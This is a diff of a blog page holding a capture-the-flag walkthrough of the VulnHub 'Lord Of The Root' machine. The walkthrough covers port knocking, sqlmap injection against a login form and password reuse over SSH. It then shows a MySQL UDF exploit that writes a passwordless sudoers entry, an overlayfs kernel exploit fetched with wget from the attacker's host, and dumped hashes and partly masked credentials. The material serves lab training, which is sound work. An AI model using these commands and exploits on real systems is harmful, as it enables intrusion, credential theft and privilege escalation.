@@ -31,19 +31,19 @@
       </table>
     </div>
     <div class="body">
-          <h1>[VulnHub] Lord Of The Root: 1.0.1</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Lord Of The Root: 1.0.1</h1>
                   <p><a href="/posts/20191009_vulnhub-kioptrix5.html"> « </a>📅 published on <code>10/Oct/2019</code><a href="/posts/20191010_vulnhub-linsecurity1.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root: 1.0.1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_lordoftheroot101/machinescli.png.webp" /></p>
-<h3>Killchain</h3>
-<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_lordoftheroot101/killchain.png.webp" /></p>
-<h3>TTPs</h3>
-<p>1. <code>1337/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs">privesc_kernel_overlayfs</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_root">privesc_mysql_root</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_udf">privesc_mysql_udf</a>  </p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.70 scan initiated Thu Oct 10 14:06:38 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/xml/_quick_tcp_nmap.xml 192.168.92.151
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root: 1.0.1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_lordoftheroot101/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_lordoftheroot101/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested">1. <code>1337/tcp/http/Apache httpd 2.4.7 ((Ubuntu))</code>: <a href="https://github.com/7h3rAm/writeups#exploit_sqli">exploit_sqli</a>, <a href="https://github.com/7h3rAm/writeups#exploit_credsreuse">exploit_credsreuse</a>, <a href="https://github.com/7h3rAm/writeups#privesc_kernel_overlayfs">privesc_kernel_overlayfs</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_root">privesc_mysql_root</a>, <a href="https://github.com/7h3rAm/writeups#privesc_mysql_udf">privesc_mysql_udf</a>  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<pre class="nested"><code># Nmap 7.70 scan initiated Thu Oct 10 14:06:38 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.lordoftheroot101/results/192.168.92.151/scans/xml/_quick_tcp_nmap.xml 192.168.92.151
 Nmap scan report for 192.168.92.151
 Host is up, received arp-response (0.00035s latency).
 Scanned at 2019-10-10 14:06:39 PDT for 5s
@@ -67,10 +67,10 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Thu Oct 10 14:06:44 2019 -- 1 IP address (1 host up) scanned in 5.59 seconds
 </code></pre>
-<p>2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/openports.png.webp" />  </p>
-<p>3. We just have 1 open port, <code>22/tcp</code> and start there. Upon connecting we see a banner that hints at port knocking sequence <code>1,2,3</code>. We knock on these ports and find a new port, <code>1337/tcp</code>, open up on the target system:  </p>
-<pre><code>ssh root@192.168.92.151
+<p class="nested">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/openports.png.webp" />  </p>
+<p class="nested">3. We just have 1 open port, <code>22/tcp</code> and start there. Upon connecting we see a banner that hints at port knocking sequence <code>1,2,3</code>. We knock on these ports and find a new port, <code>1337/tcp</code>, open up on the target system:  </p>
+<pre class="nested"><code>ssh root@192.168.92.151
                                                     .____    _____________________________
                                                     |    |   \_____  \__    ___/\______   \
                                                     |    |    /   |   \|    |    |       _/
@@ -91,11 +91,11 @@ knock 192.168.92.151 1,2,3
   22/tcp   open  ssh
   1337/tcp open  waste
 </code></pre>
-<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.3.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png.webp" />  </p>
-<p>4. We see that the newly opened port is running a HTTP service. We explore it using a web browser. We find a Base64 encoded text within HTML source of the <code>robots.txt</code> page. Upon decoding it twice we find a directory path which leads to a login form:  </p>
-<pre><code>http://192.168.92.151:1337/robots.txt
+<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.3.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png.webp" />  </p>
+<p class="nested">4. We see that the newly opened port is running a HTTP service. We explore it using a web browser. We find a Base64 encoded text within HTML source of the <code>robots.txt</code> page. Upon decoding it twice we find a directory path which leads to a login form:  </p>
+<pre class="nested"><code>http://192.168.92.151:1337/robots.txt
   THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
 
 b64d THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
@@ -104,35 +104,35 @@ b64d THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
 b64d Lzk3ODM0NTIxMC9pbmRleC5waHA=
   /978345210/index.php
 </code></pre>
-<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.4.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png.webp" />  </p>
-<h3>Findings</h3>
-<h4>Open Ports</h4>
-<pre><code>22/tcp    |  ssh   |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
+<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.4.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.4.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png.webp" />  </p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>22/tcp    |  ssh   |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
 1337/tcp  |  http  |  Apache httpd 2.4.7 ((Ubuntu))
 </code></pre>
-<h4>Files</h4>
-<pre><code>http://192.168.92.151:1337/robots.txt
+<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
+<pre class="nested"><code>http://192.168.92.151:1337/robots.txt
 http://192.168.92.151:1337/978345210/index.php
 </code></pre>
-<h4>Users</h4>
-<pre><code>ssh: smeagol
+<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
+<pre class="nested"><code>ssh: smeagol
 webapp: frodo, smeagol, aragorn, legolas, gimli
 </code></pre>
-<h2>Phase #2: Exploitation</h2>
-<p>1. We run <code>sqlmap</code> against this login form and dump the contents of the backend database. Within this dump we find credentials for five users:  </p>
-<pre><code>sqlmap -u &quot;http://192.168.92.151:1337/978345210/index.php&quot; --batch --forms --dump
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. We run <code>sqlmap</code> against this login form and dump the contents of the backend database. Within this dump we find credentials for five users:  </p>
+<pre class="nested"><code>sqlmap -u &quot;http://192.168.92.151:1337/978345210/index.php&quot; --batch --forms --dump
 </code></pre>
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png.webp" />  </p>
-<p>2. We check if any of these users have a local account on the target system and if they have reused their web application credentials for system login as well. We find that user <code>smeagol</code> has an account on the target system and has reused their password. This gives us a local interactive SSH access on the target system:  </p>
-<pre><code>ssh smeagol@192.168.92.151
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png.webp" />  </p>
+<p class="nested">2. We check if any of these users have a local account on the target system and if they have reused their web application credentials for system login as well. We find that user <code>smeagol</code> has an account on the target system and has reused their password. This gives us a local interactive SSH access on the target system:  </p>
+<pre class="nested"><code>ssh smeagol@192.168.92.151
 </code></pre>
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png.webp" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>smeagol@LordOfTheRoot&gt; id
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested"><code>smeagol@LordOfTheRoot&gt; id
 uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)
 smeagol@LordOfTheRoot&gt;  
 smeagol@LordOfTheRoot&gt; uname
@@ -153,21 +153,21 @@ smeagol@LordOfTheRoot&gt; users
 root
 smeagol
 </code></pre>
-<h2>Phase #3: Privilege Escalation</h2>
-<p>1. While exploring the web root directory we find <code>mysql</code> credentials within the <code>login.php</code> file. This will be useful in next steps:  </p>
-<pre><code>cd /var/www
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. While exploring the web root directory we find <code>mysql</code> credentials within the <code>login.php</code> file. This will be useful in next steps:  </p>
+<pre class="nested"><code>cd /var/www
 grep -nir mysql ./
 </code></pre>
-<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png.webp" />  </p>
-<p>2. We find that <code>mysql</code> is running with elevated privileges. This opens the possibility of running the UDF exploit and as such we look for <code>lib_mysqludf_sys.so</code> file on the target system. This file is not found so we have to use an exploit to create one and use it from <code>mysql</code> shell (using credentials found in previous step):  </p>
-<pre><code>ps aux | grep -i mysql
+<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png.webp" />  </p>
+<p class="nested">2. We find that <code>mysql</code> is running with elevated privileges. This opens the possibility of running the UDF exploit and as such we look for <code>lib_mysqludf_sys.so</code> file on the target system. This file is not found so we have to use an exploit to create one and use it from <code>mysql</code> shell (using credentials found in previous step):  </p>
+<pre class="nested"><code>ps aux | grep -i mysql
 locate lib_mysqludf_sys.so
 cd /tmp
 wget http://192.168.92.183:9999/1518.c
 </code></pre>
-<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png.webp" />  </p>
-<p>3. We follow the steps mentioned within the exploit to compile and create the shared object file. We then connect to the <code>mysql</code> shell, load the shared object and map it to a custom function called <code>do_system</code>. This function can now be used to execute commands from within <code>mysql</code> shell with elevated privileges. We run a command to give all permissions to user <code>smeagol</code>:  </p>
-<pre><code>gcc -g -c 1518.c
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png.webp" />  </p>
+<p class="nested">3. We follow the steps mentioned within the exploit to compile and create the shared object file. We then connect to the <code>mysql</code> shell, load the shared object and map it to a custom function called <code>do_system</code>. This function can now be used to execute commands from within <code>mysql</code> shell with elevated privileges. We run a command to give all permissions to user <code>smeagol</code>:  </p>
+<pre class="nested"><code>gcc -g -c 1518.c
 gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc
 mysql -u localhost -u root -p
   use mysql;
@@ -180,38 +180,38 @@ mysql -u localhost -u root -p
   create function do_system returns integer soname '1518.so';
   select do_system('echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers');
 </code></pre>
-<p><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.3.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.3.4" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png.webp" />  </p>
-<p>4. We can now exit from the <code>mysql</code> shell, check for user <code>smeagol</code>'s <code>sudo</code> privileges and switch to user <code>root</code>:  </p>
-<pre><code>sudo -l
+<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.3.3" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.3.4" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png.webp" />  </p>
+<p class="nested">4. We can now exit from the <code>mysql</code> shell, check for user <code>smeagol</code>'s <code>sudo</code> privileges and switch to user <code>root</code>:  </p>
+<pre class="nested"><code>sudo -l
 </code></pre>
-<p><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png.webp" />  </p>
-<p>5. Another way to gain elevated privileges is to run the <code>overlayfs</code> exploit on the target system because it has a kernel compiled before <code>2015-12-26</code>:  </p>
-<pre><code>cd /tmp
+<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png.webp" />  </p>
+<p class="nested">5. Another way to gain elevated privileges is to run the <code>overlayfs</code> exploit on the target system because it has a kernel compiled before <code>2015-12-26</code>:  </p>
+<pre class="nested"><code>cd /tmp
 wget http://192.168.92.183:9999/39166.c
 gcc -o 39166 39166.c
 ./39166
 </code></pre>
-<p><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png.webp" />  </p>
-<p><img alt="writeup.privesc.steps.5.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png.webp" />  </p>
-<p>6. Once we have elevated privileges, we can view the contents of the <code>/root/Flag.txt</code> file to complete the challenge:  </p>
-<pre><code>cat /root/Flag.txt
+<p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png.webp" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.5.2" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png.webp" />  </p>
+<p class="nested">6. Once we have elevated privileges, we can view the contents of the <code>/root/Flag.txt</code> file to complete the challenge:  </p>
+<pre class="nested"><code>cat /root/Flag.txt
 </code></pre>
-<p><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png.webp" />  </p>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1M........................
+<p class="nested"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<pre class="nested"><code>root:$6$cQPCchYp$rWjOEHF47iuaGk/DQdkG6Dhhfm3.hTaNZPO4MoyBz2.bn44fERcQ23XCsp43LOt5NReEUjwDF8WDa5i1M........................
 smeagol:$6$vu8Pfezj$6ldY35ytL8yRd.Gp947FnW3t/WrMZXIL7sqTQS4wuSKeAiYeoYCy7yfS2rBpAPvFCPuo73phXmpOoLsg5........................
 </code></pre>
-<h3>Credentials</h3>
-<pre><code>webapp: frodo/iwilltaketh....., smeagol/MyPreciou....., aragorn/AndMyS...., legolas/AndM...., gimli/AndMy...
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<pre class="nested"><code>webapp: frodo/iwilltaketh....., smeagol/MyPreciou....., aragorn/AndMyS...., legolas/AndM...., gimli/AndMy...
 mysql: root/darksha...
 ssh: smeagol/MyPreciou.....
 </code></pre>
-<h2>References</h2>
-<ul>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a>  </li>
 <li><a href="https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README">https://github.com/Hamza-Megahed/CTFs/blob/master/lord-of-the-root/README</a>  </li>
 <li><a href="https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html">https://blog.geoda-security.com/2017/02/lord-of-r00t-walkthrough.html</a>  </li>
@@ -223,19 +223,12 @@ ssh: smeagol/MyPreciou.....
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
